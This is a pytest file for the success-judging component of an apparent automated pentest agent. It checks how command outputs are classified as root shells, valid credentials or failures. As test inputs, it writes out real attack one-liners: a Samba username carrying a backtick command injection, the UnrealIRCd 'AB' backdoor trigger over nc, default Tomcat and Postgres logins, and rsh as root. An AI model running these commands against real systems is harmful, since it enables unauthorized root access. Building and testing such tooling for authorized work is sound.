from app.services.pentest_agent.success_judge import judge_success


def test_judge_root_shell_from_uid():
    r = judge_success("shell", "id", "uid=0(root) gid=0(root)", "", 0)
    assert r.success is True
    assert r.evidence_type == "root_shell"
    assert r.failure_reason == ""


def test_judge_postgres_version_as_credential_valid():
    out = "PostgreSQL 8.3.1 on i486-pc-linux-gnu\n(1 row)"
    r = judge_success("shell", "PGPASSWORD=postgres psql -h 1.2.3.4 -U postgres -c \"select version()\"", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "credential_valid"
    assert "postgres" in r.service


def test_judge_mysql_blocked():
    err = "ERROR 1129 (HY000): Host '1.2.3.4' is blocked because of many connection errors"
    r = judge_success("shell", "mysql -h target -u root", err, "", 1)
    assert r.success is False
    assert r.failure_reason == "blocked"


def test_judge_msf_no_session():
    out = "[*] Exploit completed, but no session was created."
    r = judge_success("msfconsole", "use x", out, "", 0)
    assert r.success is False
    assert r.failure_reason == "no_session"


def test_judge_tomcat_default_creds():
    """Tomcat 默认凭据验证成功"""
    out = "TOMCAT_CRED_OK tomcat:tomcat\n<html><title>Tomcat Manager</title></html>"
    r = judge_success("shell", "curl -u tomcat:tomcat http://target:8180/manager/html", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "credential_valid"
    assert r.service == "tomcat"


def test_judge_tomcat_creds_failed():
    """Tomcat 默认凭据验证失败"""
    out = "TOMCAT_CRED_FAILED"
    r = judge_success("shell", "curl -u tomcat:tomcat http://target:8180/manager/html", out, "", 0)
    assert r.success is False
    assert r.failure_reason == "auth_failed"


def test_judge_vnc_rfb_banner():
    """VNC 无认证 — RFB 协议 banner"""
    out = "RFB 003.008\n"
    r = judge_success("shell", "echo '' | nc -w 5 target 5900", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "evidence"
    assert r.service == "vnc"


def test_judge_samba_share_list():
    """Samba smbclient 输出 share 列表"""
    out = "\tSharename       Type      Comment\n\t---------       ----      -------\n\tprint$          Disk      Printer Drivers"
    r = judge_success("shell", "smbclient -L target -U './= `id`' -N", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "evidence"
    assert r.service == "samba"


def test_judge_distcc_uid_output():
    """distccd 命令执行返回 uid 信息"""
    out = "uid=0(root) gid=0(root)\nroot\nLinux target 2.6.24"
    r = judge_success("shell", "python3 -c 'import socket...'", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "root_shell"


def test_judge_unrealircd_ab_command():
    """UnrealIRCd AB 后门返回 shell 输出"""
    out = ":irc!irc@target NOTICE AUTH :*** Couldn't look up your hostname\nuid=0(root)"
    r = judge_success("shell", "printf 'ABid\\n' | nc -w 5 target 6667", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "root_shell"


def test_judge_rlogin_shell():
    """rlogin/rsh 返回 shell 输出"""
    out = "uid=0(root) gid=0(root) groups=0(root)\nroot\nLinux target"
    r = judge_success("shell", "rsh -l root target 'id; whoami; uname -a'", out, "", 0)
    assert r.success is True
    assert r.evidence_type == "root_shell"


def test_judge_connection_refused():
    """连接被拒绝"""
    out = "nc: connect to target port 3632 (tcp) failed: Connection refused"
    r = judge_success("shell", "nc -w 5 target 3632", out, "", 1)
    assert r.success is False
    assert r.failure_reason == "conn_refused"
